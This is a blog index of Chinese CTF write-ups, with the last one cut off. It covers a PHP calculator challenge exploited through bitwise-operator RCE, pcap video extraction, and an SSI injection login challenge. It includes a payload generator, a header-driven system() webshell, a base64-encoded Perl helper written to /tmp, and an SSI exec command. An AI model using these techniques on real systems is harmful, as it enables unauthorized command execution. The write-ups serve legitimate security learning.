<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2020-RCTF-Web-calc</title>
    <url>/2020/07/03/2020-RCTF-Web-calc/</url>
    <content><![CDATA[<p>这道题看了wp后也还是一脸懵逼的状态，但大致过程是了解了，知道了如何利用这个点去进行rce，至于里面的perl的exp，还有异或生成shell的python脚本，还得好好研究下，我太菜了！</p>
<blockquote>
<p>这次主要参考了Y1ng师傅的wp和w4nder师傅的wp，把链接直接贴在下面吧，有些东西师傅们的博客里写的很清楚了，我也不再赘述</p>
</blockquote>
<p><a href="https://www.gem-love.com/ctf/2373.html" target="_blank" rel="noopener">Y1ng师傅的wp</a></p>
<p><a href="http://phoebe233.cn/index.php/archives/44/" target="_blank" rel="noopener">w4nder师傅的wp</a></p>
<p>首先进题目是个计算页面，直接查看一下源码，发现有calc.php，访问后得到calc.php的源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    $blacklist = [<span class="string">'[a-z]'</span>, <span class="string">'[\x7f-\xff]'</span>, <span class="string">'\s'</span>,<span class="string">"'"</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>, <span class="string">'_'</span>, <span class="string">'\\\\'</span>,<span class="string">'\^'</span>, <span class="string">','</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $str)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到是过滤了a-z，[\x7f-\xff]以及一些符号，但是没有过滤位运算符<code>|和&amp;</code>所以根据这一点，就知道了这题的是通过php中位运算来进行rce达到命令执行的目的</p>
<h3 id="关于如何取得字符"><a href="#关于如何取得字符" class="headerlink" title="关于如何取得字符"></a>关于如何取得字符</h3><p>这里主要用的是php的一些特性，可以获得几个字符</p>
<p>这里就直接引用Y1ng师傅的解释，讲的非常明白</p>
<blockquote>
<p><strong>获得数字字符</strong></p>
<p>我们可以得到任意数字，<code>(1)</code>仍是int，但是如果<code>((1).(2))</code> （注意需要套一个括号否则出错）就会得到字符串<code>“12”</code></p>
<p><img src="/2020/07/03/2020-RCTF-Web-calc/1.jpg" alt="img"></p>
<p>之后再通过字符串截取即可得到单字符，PHP中可以使用大括号来完成，也是按照惯例，第一个字符编号是0，第二个是1，以此类推</p>
<p><img src="/2020/07/03/2020-RCTF-Web-calc/2.jpg" alt="img"></p>
<p><strong>获得部分字符</strong></p>
<p>通过<code>NAN INF</code>以及科学计数法可以获得INAFE这5个字母，这样得到：</p>
<p><img src="/2020/07/03/2020-RCTF-Web-calc/3.jpg" alt="img"></p>
<p>但是得到的是float类型，同样使用大括号截取并不能得到对应的单字符，反而会报错并返回NULL</p>
<p><img src="/2020/07/03/2020-RCTF-Web-calc/4.jpg" alt="img"></p>
<p>那我们还可以通过刚刚的方法，让两个数字做点运算然后加上括号包裹，再用<code>{}</code>截取，即可：</p>
<p><img src="/2020/07/03/2020-RCTF-Web-calc/5.jpg" alt="img"></p>
</blockquote>
<h3 id="php中的位运算"><a href="#php中的位运算" class="headerlink" title="php中的位运算"></a>php中的位运算</h3><blockquote>
<p>php 位运算符 &amp; (按为与)<br>将&amp;两边的数值二进制化进行比较  两边分别8位数相互对应 都为1则为1否则为0<br>列: 1 &amp; 2<br>  1的二进制为 00000001<br>  2的二进制为 00000010<br>              00000000 16进制转回来是0<br>  所以 1 &amp; 2  打印就是 0;</p>
<p>例: 15 &amp; 8<br>15的二进制为 00001111<br> 8的二进制为  00001000<br>             00001000 16进制转回来是 8<br> 所以 15 &amp; 8  打印就是 8;</p>
<p>php 位运算符 |  (按位或)<br>将|两边的数值二进制化进行比较  两边分别8位数相互对应 有1就为1否则为0<br>列: 1 | 8<br> 1的二进制为 00000001<br> 8的二进制为 00001000<br>              00001001 16进制转回来是9<br> 所以 1 | 8  打印就是 9;</p>
</blockquote>
<h3 id="使用位运算获得更多字符"><a href="#使用位运算获得更多字符" class="headerlink" title="使用位运算获得更多字符"></a>使用位运算获得更多字符</h3><p>经过上面的运算，我们仅仅只获得了几个字符，那么如何获取更多字符呢？相信大家也都想到了，那就是套娃，用获得的字符进行位运算<code>|和&amp;</code>，然后再用位运算得到的字符再进行位运算，一直套娃，就可以获得几乎全部字符（不能说全部，根据大师傅说的还是有几个获取不了的），也就达到了rce的目的。这里也是贴一个<code>cjm00n师傅的脚本</code>，可以直接把命令转化为位运算后的结果，以后遇到类似的也可以直接用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">table = list(<span class="string">b'0123456789.-EINF'</span>)</span><br><span class="line">dict=&#123;&#125;</span><br><span class="line">l=len(table)</span><br><span class="line">temp=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> temp!=l:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(temp,l):</span><br><span class="line">        <span class="keyword">if</span> ~table[j] &amp; <span class="number">0xff</span> <span class="keyword">not</span> <span class="keyword">in</span> table:</span><br><span class="line">            table.append(~table[j] &amp; <span class="number">0xff</span>)</span><br><span class="line">            dict[~table[j] &amp; <span class="number">0xff</span>] = &#123;<span class="string">'op'</span>:<span class="string">'~'</span>,<span class="string">'c'</span>:table[j]&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(max(i+<span class="number">1</span>,temp),l):</span><br><span class="line">            t = table[i] &amp; table[j]</span><br><span class="line">            <span class="keyword">if</span> t <span class="keyword">not</span> <span class="keyword">in</span> table:</span><br><span class="line">                table.append(t)</span><br><span class="line">                dict[t] = &#123;<span class="string">'op'</span>:<span class="string">'&amp;'</span>,<span class="string">'c1'</span>:table[i],<span class="string">'c2'</span>:table[j]&#125;</span><br><span class="line">            t = table[i] | table[j]</span><br><span class="line">            <span class="keyword">if</span> t <span class="keyword">not</span> <span class="keyword">in</span> table:</span><br><span class="line">                table.append(t)</span><br><span class="line">                dict[t] = &#123;<span class="string">'op'</span>: <span class="string">'|'</span>, <span class="string">'c1'</span>: table[i], <span class="string">'c2'</span>: table[j]&#125;</span><br><span class="line">    temp=l</span><br><span class="line">    l=len(table)</span><br><span class="line"></span><br><span class="line">table.sort()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">howmake</span><span class="params">(ch:int)</span> -&gt; str:</span></span><br><span class="line">    <span class="keyword">if</span> ch <span class="keyword">in</span> <span class="string">b'0123456789'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(((1).('</span> + chr(ch) + <span class="string">'))&#123;1&#125;)'</span></span><br><span class="line">    <span class="keyword">elif</span> ch <span class="keyword">in</span> <span class="string">b'.'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(((1).(0.1))&#123;2&#125;)'</span></span><br><span class="line">    <span class="keyword">elif</span> ch <span class="keyword">in</span> <span class="string">b'-'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(((1).(-1))&#123;1&#125;)'</span></span><br><span class="line">    <span class="keyword">elif</span> ch <span class="keyword">in</span> <span class="string">b'E'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(((1).(0.00001))&#123;4&#125;)'</span></span><br><span class="line">    <span class="keyword">elif</span> ch <span class="keyword">in</span> <span class="string">b'I'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(((999**999).(1))&#123;0&#125;)'</span></span><br><span class="line">    <span class="keyword">elif</span> ch <span class="keyword">in</span> <span class="string">b'N'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(((999**999).(1))&#123;1&#125;)'</span></span><br><span class="line">    <span class="keyword">elif</span> ch <span class="keyword">in</span> <span class="string">b'F'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(((999**999).(1))&#123;2&#125;)'</span></span><br><span class="line"></span><br><span class="line">    d = dict.get(ch)</span><br><span class="line">    <span class="keyword">if</span> d:</span><br><span class="line">        op = d.get(<span class="string">'op'</span>)</span><br><span class="line">        <span class="keyword">if</span> op == <span class="string">'~'</span>:</span><br><span class="line">            c = <span class="string">'~'</span>+howmake(d.get(<span class="string">'c'</span>))</span><br><span class="line">        <span class="keyword">elif</span> op ==<span class="string">'&amp;'</span>:</span><br><span class="line">            c = howmake(d.get(<span class="string">'c1'</span>)) + <span class="string">'&amp;'</span> + howmake(d.get(<span class="string">'c2'</span>))</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="string">'|'</span>:</span><br><span class="line">            c = howmake(d.get(<span class="string">'c1'</span>)) + <span class="string">'|'</span> + howmake(d.get(<span class="string">'c2'</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f'(<span class="subst">&#123;c&#125;</span>)'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'error'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        payload = input(<span class="string">'&gt;'</span>)</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">            result.append(howmake(ord(i)))</span><br><span class="line">        result=<span class="string">'.'</span>.join(result)</span><br><span class="line">        print(<span class="string">f'(<span class="subst">&#123;result&#125;</span>)'</span>)</span><br></pre></td></tr></table></figure>

<h3 id="构造system-next-getallheaders-执行命令"><a href="#构造system-next-getallheaders-执行命令" class="headerlink" title="构造system(next(getallheaders()))执行命令"></a>构造system(next(getallheaders()))执行命令</h3><blockquote>
<p>最后的命令执行我在ctfhub上打过去复现失败了，直接给命令显示出来了，不知道为啥，可能题目有改过吧，我太菜了，这里就直接用Y1ng师傅和w4nder师傅的结果吧</p>
<p><img src="/2020/07/03/2020-RCTF-Web-calc/5.png" alt="img"></p>
</blockquote>
<p>正常来讲，使用上面脚本将system(‘ls /‘)变为位运算的结果后打过去应该可以看到根目录下有一个/readflag文件</p>
<p>使用上面的脚本，再次构造system(‘/readflag’)的位运算形式，（打过去的时候记得要url编码一次，不然无法识别）会发现得到了一个需要计算结果才能得到flag的页面</p>
<p><img src="/2020/07/03/2020-RCTF-Web-calc/6.jpg" alt="img"></p>
<p>再次引用Y1ng师傅的解释</p>
<blockquote>
<p>这个之前在2019 *CTF包括前几天的De1CTF等都有出现，这东西实际上是运行在系统上，有几种解决办法，比如trap等等，但是前提是先获得一个交互式shell，于是我又构造了反弹shell结果没成功，去问了管理员说是靶机不能出网</p>
<p>还可以用php或者perl的exp一键打，但是Payload比较长，所以我们必须要构造一个webshell，弄一个可控参数，然后把我们的Payload放上去，于是很容易想到了这样的格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system(next(getallheaders()))</span><br></pre></td></tr></table></figure>
</blockquote>
<p>由于get请求有长度限制，所以我们无法将所有payload全部写在请求里，于是可以用<code>system(next(getallheaders()))</code>来读取请求头中的内容作为命令执行</p>
<p>至于payload，这里我选择的的是w4nder师傅的的perl文件的形式</p>
<blockquote>
<p>可以将payload写入/tmp下然后用perl执行，编码一下防止数据丢失</p>
<p>echo ‘IyEvdXNyL2Jpbi9lbnYgcGVybAogICAgICAgIHVzZSB3YXJuaW5nczsKICAgICAgICB1c2Ugc3RyaWN0OwogICAgICAgIHVzZSBJUEM6Ok9wZW4yOwogICAgICAgICR8ID0gMTsKICAgICAgICBteSAkcGlkID0gb3BlbjIoXCpvdXQyLCBcKmluMiwgIi9yZWFkZmxhZyIpIG9yIGRpZTsKICAgICAgICBteSAkcmVwbHkgPSA8b3V0Mj47CiAgICAgICAgcHJpbnQgU1RET1VUICRyZXBseTsKICAgICAgICAkcmVwbHkgPSA8b3V0Mj47CiAgICAgICAgcHJpbnQgU1RET1VUICRyZXBseTsKICAgICAgICBteSAkYW5zd2VyID0gZXZhbCgkcmVwbHkpOwogICAgICAgIHByaW50IFNURE9VVCAiYW5zd2VyOiAkYW5zd2VyXFxuIjsKICAgICAgICBwcmludCBpbjIgIiAkYW5zd2VyICI7CiAgICAgICAgaW4yLT5mbHVzaCgpOwogICAgICAgICRyZXBseSA9IDxvdXQyPjsKICAgICAgICBwcmludCBTVERPVVQgJHJlcGx5OwogICAgICAgICRyZXBseSA9IDxvdXQyPjsKICAgICAgICBwcmludCBTVERPVVQgJHJlcGx5Ow==’|base64 -d &gt;/tmp/a.pl</p>
<p><img src="/2020/07/03/2020-RCTF-Web-calc/7.png" alt="img"></p>
</blockquote>
<p>可以看到上面是将写入文件的过程放在了Cache—Control这个请求头中，再利用<code>system(next(getallheaders()))</code>来达到命令执行的目的</p>
<p>至于上面那串perl代码，base64解码后是这样的，perl代码我也不太懂，有空得研究下</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env perl</span></span><br><span class="line">        <span class="keyword">use</span> warnings;</span><br><span class="line">        <span class="keyword">use</span> strict;</span><br><span class="line">        <span class="keyword">use</span> IPC::Open2;</span><br><span class="line">        $| = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">my</span> $pid = open2(\*out2, \*in2, <span class="string">"/readflag"</span>) <span class="keyword">or</span> <span class="keyword">die</span>;</span><br><span class="line">        <span class="keyword">my</span> $reply = &lt;out2&gt;;</span><br><span class="line">        <span class="keyword">print</span> STDOUT $reply;</span><br><span class="line">        $reply = &lt;out2&gt;;</span><br><span class="line">        <span class="keyword">print</span> STDOUT $reply;</span><br><span class="line">        <span class="keyword">my</span> $answer = <span class="keyword">eval</span>($reply);</span><br><span class="line">        <span class="keyword">print</span> STDOUT <span class="string">"answer: $answer\\n"</span>;</span><br><span class="line">        <span class="keyword">print</span> in2 <span class="string">" $answer "</span>;</span><br><span class="line">        in2-&gt;flush();</span><br><span class="line">        $reply = &lt;out2&gt;;</span><br><span class="line">        <span class="keyword">print</span> STDOUT $reply;</span><br><span class="line">        $reply = &lt;out2&gt;;</span><br><span class="line">        <span class="keyword">print</span> STDOUT $reply;</span><br></pre></td></tr></table></figure>

<p>大概的意思就是执行/readflag，然后将他的输出放到$reply变量里，然后用eval计算返回给程序，最后再次得到的$reply就是flag，虽然没学过但我觉得大致就是这个意思emmm，收藏了能用就行</p>
<blockquote>
<p>然后执行perl /tmp/a.pl即可</p>
<p><img src="/2020/07/03/2020-RCTF-Web-calc/8.png" alt="img"></p>
</blockquote>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>匆匆忙忙赶了篇博客，大多数地方都是照搬大师傅们的博客，这个rctf/xctf的题目真的好难呀，这貌似是web里最简单的一道了，然而还是好多都没看懂，不禁感叹我太菜了呜呜呜呜/(ㄒoㄒ)/~~。自己还有好多不懂的地方，得再去仔细研究，不过也有所收获，知道了如何去构造异或型的shell，对php中的一些运算规则也有了更多理解，还收获了两个exp，总之好好记录是最重要的，加油💪</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>php代码审计</tag>
        <tag>无字符shell</tag>
        <tag>rce</tag>
        <tag>php位运算</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-SCTF-Misc-AndroidDisplayBridge</title>
    <url>/2020/07/16/2020-SCTF-Misc-AndroidDisplayBridge/</url>
    <content><![CDATA[<p>这道题主要参考了这位师傅的wp，挂个链接先</p>
<p><a href="https://xuanxuanblingbling.github.io/ctf/android/2020/07/07/h264/#" target="_blank" rel="noopener">SCTF 2020 AndroidDisplayBridge</a></p>
<ul>
<li>题目附件：<a href="https://xuanxuanblingbling.github.io/assets/attachment/sctf_attachment.pcapng" target="_blank" rel="noopener">sctf_attachment.pcapng</a></li>
</ul>
<ul>
<li>题目描述：Finding his android phone’s touchscreen not working, he logged in his computer and painted something…</li>
</ul>
<p>首先题目给了一个流量包，打开发现里面是tcp协议的一些流量，直接追踪看下</p>
<p><img src="/2020/07/16/2020-SCTF-Misc-AndroidDisplayBridge/1.png" alt></p>
<p>发现关键内容<em>/data/local/tmp/scrcpy-server.jar</em>，百度一下可以知道，是一款投屏软件，叫scrcpy</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/98696451" target="_blank" rel="noopener">安卓游戏利器scrcpy</a></li>
</ul>
<p>根据这篇知乎上的文章，可以知道scrcpy的视频流是H264编码，于是就去了解了下h264编码的视频格式</p>
<p>这里引用下参考wp的师傅的话</p>
<blockquote>
<p>原来H264是一种视频编码，其中是没有声音信息的，如果在配上一段AAC编码的音频，就能封装出一个完整有图像有声音的MP4视频啦。如果去显示一下自己电脑中MP4视频的详细信息，一般也会看到视频和音频的编码方式。所以，知道未经过封装的H264的数据长什么样我们就能从数据包中把他提取出来。那么这个家伙长啥样呢？</p>
<ul>
<li><a href="https://www.jianshu.com/p/dc26fba79cdc" target="_blank" rel="noopener">解密纯264文件格式</a></li>
<li><a href="https://blog.csdn.net/yuanchunsi/article/details/73194569" target="_blank" rel="noopener">H264格式说明及解析</a></li>
</ul>
</blockquote>
<p>根据上面链接里了解到的，h264视频的文件头是<em>00 00 00 01 67</em>，而在数据包中尝试搜索了一下，发现确实是有这个开头的</p>
<p><img src="/2020/07/16/2020-SCTF-Misc-AndroidDisplayBridge/2.png" alt></p>
<p>所以现在要做的就是尝试将这个视频导出来</p>
<p>这里可以用一个偷懒的办法</p>
<blockquote>
<p>虽然在一整个数据包中，视频流数据上下还穿插着adb的命令，不过我记得视频流编码的容错性非常强，而且如果播放器足够强大，花了呼哨的视频也能放出人来。所以我就直接导出了tcp流，选择数据为手机端发送，然后以原始数据导出，就获得了包含有H264的二进制文件</p>
</blockquote>
<p>就是直接选择5555端口发送出去的数据，即手机发送过去的数据，然后用原始数据的方式导出</p>
<p><img src="/2020/07/16/2020-SCTF-Misc-AndroidDisplayBridge/3.png" alt></p>
<p>导出后需要注意，这时视频还是不能直接播放的，以为文件头前还有多余内容，需要删掉才行</p>
<p><img src="/2020/07/16/2020-SCTF-Misc-AndroidDisplayBridge/4.png" alt></p>
<p>将00 00 00 01 67 前的内容删掉后，发现视频即可正常播放</p>
<p><img src="/2020/07/16/2020-SCTF-Misc-AndroidDisplayBridge/5.png" alt></p>
<p>最后得到flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flag:SCTF&#123;better_access_with_scrcpy&#125;</span><br></pre></td></tr></table></figure>

<p>也可以使用如下脚本将数据包中的视频导出:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line">captures = pyshark.FileCapture(<span class="string">'./sctf_attachment.pcapng'</span>)</span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> capture <span class="keyword">in</span> captures:</span><br><span class="line">    <span class="keyword">if</span> hasattr(capture.tcp,<span class="string">"payload"</span>) :</span><br><span class="line">        <span class="keyword">if</span> capture.ip.src == <span class="string">'192.168.1.103'</span>:</span><br><span class="line">            payload += capture.tcp.payload.replace(<span class="string">":"</span>,<span class="string">""</span>).decode(<span class="string">"hex"</span>) </span><br><span class="line">f = open(<span class="string">"out.h264"</span>,<span class="string">"wb"</span>)</span><br><span class="line">f.write(payload)</span><br></pre></td></tr></table></figure>

<p>最后提供一下官方的解法，毕竟这只是一种偷懒的办法，要是内容再花里胡哨一点，估计这样做视频是放不出来的</p>
<p>官方WP的解法是数据包中存在着触屏绘图的坐标，提取坐标即可画出flag，自己没想到，也感觉略麻烦。</p>
<ul>
<li><a href="https://github.com/SycloverSecurity/SCTF2020" target="_blank" rel="noopener">SCTF 2020</a></li>
<li><a href="https://mp.weixin.qq.com/s/puJPmfKOsfbzV-11ggY75Q" target="_blank" rel="noopener">SCTF 2020 WriteUp By chamd5）</a></li>
<li><a href="https://mp.weixin.qq.com/s/O_H-4bpvTbCIGwHZdqUEYg" target="_blank" rel="noopener">SCTF 2020 Writeup By W&amp;M（Misc部分）</a></li>
</ul>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>[BJDCTF2020]EasySearch</title>
    <url>/2020/07/17/BJDCTF2020-EasySearch/</url>
    <content><![CDATA[<p>这道题是今年bjdctf第一次比赛的题，一道挺不错的简单题目，又学到了不少姿势。</p>
<h2 id="扫描得到源码"><a href="#扫描得到源码" class="headerlink" title="扫描得到源码"></a>扫描得到源码</h2><p>首先打开题目是一个需要登录的页面，一开始还以为是SQL注入，尝试了一会也没啥结果，后来看了下wp才知道是swp泄露，于是访问index.php.swp看到了源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ob_start();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span>;</span><br><span class="line">		$random = $chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">		$content = uniqid().$random;</span><br><span class="line">		<span class="keyword">return</span> sha1($content); </span><br><span class="line">	&#125;</span><br><span class="line">    header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) <span class="keyword">and</span> $_POST[<span class="string">'username'</span>] != <span class="string">''</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = <span class="string">'6d0bc1'</span>;</span><br><span class="line">        <span class="keyword">if</span> ( $admin == substr(md5($_POST[<span class="string">'password'</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;"</span>;</span><br><span class="line">            $file_shtml = <span class="string">"public/"</span>.get_hash().<span class="string">".shtml"</span>;</span><br><span class="line">            $shtml = fopen($file_shtml, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">            $text = <span class="string">'</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,'</span>.$_POST[<span class="string">'username'</span>].<span class="string">'&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***'</span>;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"[!] Header  error ..."</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[!] Failed')&lt;/script&gt;"</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段代码的主要意思就是判断输入的password的md5的前6位是否等于<code>&#39;6d0bc1&#39;</code>，如果等于的话，就将<code>Hello,&#39;.$_POST[&#39;username&#39;].&#39;</code>写入到<code>&quot;public/&quot;.get_hash().&quot;.shtml&quot;</code>中，即将输入的username写入到一个shtml文件中</p>
<h2 id="爆破md5"><a href="#爆破md5" class="headerlink" title="爆破md5"></a>爆破md5</h2><p>我们首先可以用下面这个脚本去爆破一下md5前六位为<code>&#39;6d0bc1&#39;</code>的字符串，当然这里选的是纯数字，刚刚好可以爆破出来，比赛的时候不知道有没有提示啥的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">if</span> md5(str(i)).startswith(<span class="string">'6d0bc1'</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>最后得到的结果为2020666</p>
<p>然后我们就可以随便输个用户名去登录一下试试，发现是能成功登录的</p>
<p><img src="/2020/07/17/BJDCTF2020-EasySearch/1.png" alt="1"></p>
<p>还有一个要点就是写入的shtml文件名是随机的，经过一番寻找以后发现在network中直接给了我们文件名</p>
<p><img src="/2020/07/17/BJDCTF2020-EasySearch/2.png" alt="2"></p>
<p>去访问一下这个地址发现确实是写入了</p>
<p><img src="/2020/07/17/BJDCTF2020-EasySearch/3.png" alt="3"></p>
<h2 id="SSI注入获得flag"><a href="#SSI注入获得flag" class="headerlink" title="SSI注入获得flag"></a>SSI注入获得flag</h2><p>那么怎么去获取flag呢？这里就是要用到SSI注入的知识了，这里直接引用大佬的解释</p>
<blockquote>
<p>利用SSI注入漏洞，我们可以在username变量中传入ssi语句来远程执行系统命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;命令&quot;--&gt;</span><br></pre></td></tr></table></figure>

<p>（SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。IIS和Apache都可以开启SSI功能）</p>
<p>（SSI注入的条件：</p>
<p>1.Web 服务器已支持SSI（服务器端包含）</p>
<p>2.Web 应用程序未对对相关SSI关键字做过滤</p>
<p>3.Web 应用程序在返回响应的HTML页面时，嵌入用户输入）</p>
</blockquote>
<p>然后我们就可以在用户名中输入<code>&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</code></p>
<p>密码输入<code>2020666</code>去执行命令了</p>
<p>在上级目录发现了flag文件，读取就可以拿到flag</p>
<p><img src="/2020/07/17/BJDCTF2020-EasySearch/4.png" alt="4"></p>
<p><img src="/2020/07/17/BJDCTF2020-EasySearch/5.png" alt="5"></p>
<p><img src="/2020/07/17/BJDCTF2020-EasySearch/6.png" alt="6"></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>web</tag>
        <tag>源码泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020-Mark-loves-cat</title>
    <url>/2020/06/23/BJDCTF2020-Mark-loves-cat/</url>
    <content><![CDATA[<p>稍微记录下吧，题目不难，主要是php了解的还是太少</p>
<p>题目知识点：.git泄露，php代码审计，可变变量</p>
<p>首先题目给了一个写的很好看的前端，拉到最底下看到一个dog</p>
<p>一开始也没啥思路，后来扫了下发现有.git源码泄露，主要代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span 